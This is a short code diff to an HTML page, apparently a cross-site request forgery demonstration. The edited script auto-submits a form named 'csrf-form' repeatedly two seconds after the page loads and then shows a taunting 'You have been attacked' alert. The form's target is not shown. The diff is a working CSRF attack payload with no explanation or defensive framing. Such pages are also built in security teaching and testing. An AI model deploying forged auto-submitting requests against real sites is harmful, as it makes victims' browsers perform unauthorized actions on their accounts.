@@ -13,11 +13,13 @@
 
 
     <script>
-      for (var i = 1; i < 20; i++) {
-        setTimeout(function(){
-        document.getElementById("csrf-form").submit();
+      
+      setTimeout(function(){
+        for (var i = 1; i < 20; i++) {
+          document.getElementById("csrf-form").submit();
+        }
       }, 2000)
-      }
+      
       alert('You have been attacked, HA HA HA')
     </script>
   </body>
